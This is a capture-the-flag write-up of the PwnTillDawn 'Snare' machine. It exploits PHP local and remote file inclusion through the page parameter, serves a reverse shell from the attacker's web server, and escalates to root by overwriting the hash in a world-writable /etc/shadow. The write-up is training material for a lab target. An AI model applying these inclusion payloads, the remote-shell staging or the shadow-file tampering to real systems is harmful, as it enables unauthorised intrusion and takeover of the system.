[Snare](https://online.pwntilldawn.com/Target/Show/80) is an easy box from [PwnTillDawn](https://online.pwntilldawn.com/) containing a website vulnerable to both LFI and RFI allowing us to include a php reverse shell and get a shell. After that we find a writable shadow file that we edit and get root access.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

| http-title: Welcome to my homepage!
|_Requested resource was /index.php?page=home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, one is 22 running OpenSSH on ubuntu, and the other is port 80 which is Apache also running on Ubuntu.

### Web

Let's check the website on port 80.

![website](1.png)

We notice the url is using the page parameter on index.php to load the home page.

Since it's a php website, I'll guess it's using include function here, let's see if it's vulnerable to `LFI (Local File Inclusion)`

> Local File Inclusion is a vulnerability that occurs in PHP applications that uses the `include` function to load files. This allows an attacker to read arbitrary files on the system and even execute source code files(php files in our case).
{: .prompt-info }

The website uses `index.php?page=home` to load the file, if you noticed there is no extension on `home` which means two things:

- The file doesn't have an extension.
- The website adds the extension later when the file is requested.

The test the first theory I tried requesting the `/etc/passwd` file with `http://10.150.150.18/index.php?page=../../../../../../etc/passwd` but it didn't work, which means the website is adding the extension at the end i.e. (passwd.php).

One useful function in php is the `filter` function which allows us to add encoding to the file before loading it, allowing us to read php file without running them.

```text
php://filter/convert.base64-encode/resource=
```

The line above allows us to encode the file with base64. With that let's read the index.php file that's responsible for this whole lfi.

```text
http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index
```

This gave us the following base64 string.

```text
PD9waHAgaW5jbHVkZSgiaW5jbHVkZXMvYV9jb25maWcucGhwIik7Pz4NCjwhRE9DVFlQRSBodG1sPg0KPGh0bWw+DQo8aGVhZD4NCgk8P3BocCBpbmNsdWRlKCJpbmNsdWRlcy9oZWFkLXRhZy1jb250ZW50cy5waHAiKTs/Pg0KPC9oZWFkPg0KPGJvZHk+DQoNCjw/cGhwIGluY2x1ZGUoImluY2x1ZGVzL2Rlc2lnbi10b3AucGhwIik7Pz4NCjw/cGhwIGluY2x1ZGUoImluY2x1ZGVzL25hdmlnYXRpb24ucGhwIik7Pz4NCg0KPGRpdiBjbGFzcz0iY29udGFpbmVyIiBpZD0ibWFpbi1jb250ZW50Ij4NCg0KPD9waHANCg0KaWYgKGVtcHR5KCRfR0VUKSkgew0KCWhlYWRlcignTG9jYXRpb246IC9pbmRleC5waHA/cGFnZT1ob21lJyk7DQp9IA0KZWxzZSB7DQoJJHBhZ2UgPSAkX0dFVFsncGFnZSddOw0KCWluY2x1ZGUgKCRwYWdlLiAnLnBocCcpOw0KfQ0KPz4NCjwvZGl2Pg0KDQo8P3BocCBpbmNsdWRlKCJpbmNsdWRlcy9mb290ZXIucGhwIik7Pz4NCg0KPC9ib2R5Pg0KPC9odG1sPg0K
```

After decoding it we get the following php code.

```php
<?php include("includes/a_config.php");?>
<!DOCTYPE html>
<html>
<head>
	<?php include("includes/head-tag-contents.php");?>
</head>
<body>

<?php include("includes/design-top.php");?>
<?php include("includes/navigation.php");?>

<div class="container" id="main-content">

<?php

if (empty($_GET)) {
	header('Location: /index.php?page=home');
} 
else {
	$page = $_GET['page'];
	include ($page. '.php');
}
?>
</div>

<?php include("includes/footer.php");?>

</body>
</html>
```

The line vulnerable to `LFI` is `include ($page. '.php');` which passes the value of the `page` parameter directly to the include function without any filtering. We also see that it adds `.php` at the end just like we guessed.

We see on the first line a file called `a_config.php`, configuration files are very important because sometimes they contain usernames and passwords. Let's read it.

```text
http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=includes/a_config
```

```php
<?php
	switch ($_SERVER["SCRIPT_NAME"]) {
		case "/php-template/about.php":
			$CURRENT_PAGE = "About"; 
			$PAGE_TITLE = "About Us";
			break;
		case "/php-template/contact.php":
			$CURRENT_PAGE = "Contact"; 
			$PAGE_TITLE = "Contact Us";
			break;
		default:
			$CURRENT_PAGE = "Index";
			$PAGE_TITLE = "Welcome to my homepage!";
	}
?>
```

Nothing interesting here unfortunately.

## **Foothold**

One other vulnerability in the include function of php is `RFI (Remote File Inclusion)`

>Remote File Inclusion allows an attacker to include files from a remote locations. If the files were source code they will get executed on the target system.
{: .prompt-info }

This is a very dangerous vulnerability that can give us RCE over the target system.

To test for this vulnearbility we need to first set up a http server. We can do that using python.

```bash
sudo python3 -m htt.server 80
```

Now on the `page` parameter we put our address.

```text
http://10.150.150.18/index.php?page=http://10.66.66.90/test
```

On the http server we got this:

```text
10.150.150.18 - - [09/Jan/2025 11:44:12] code 404, message File not found
10.150.150.18 - - [09/Jan/2025 11:44:12] "GET /test.php HTTP/1.0" 404 -
```

It worked and we confirmed the website is vulnerable to `RFI`.

For the exploitation part we will server a [php reverse shell](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php) that would send us a shell, then we setup a listener that will recieve the shell and then request the file.

![shell](2.png)

Great! We got a shell.

## **Privilege Escalation**

After running linpeas we discover that `/etc/shadow` is writeable by everyone.

Let's change the hash of the root user with one that we create.

```bash
openssl passwd -6 -salt xyz hacked
$6$xyz$Ptkn.yNtWRCPWI6uliKfE1qpeIawhled6c2bQuz.PtMubWn6MhYw1YgtRVbNyj62Sa330bvedzKfsZGbAue2G0
```

We created a hash of password `hacked`, now let's delete the current hash of root and add the one above. We can use `nano` for that.

After that we can ssh to the box as root.

```terminal
[â˜…]$ sshpass -p hacked ssh root@10.150.150.18
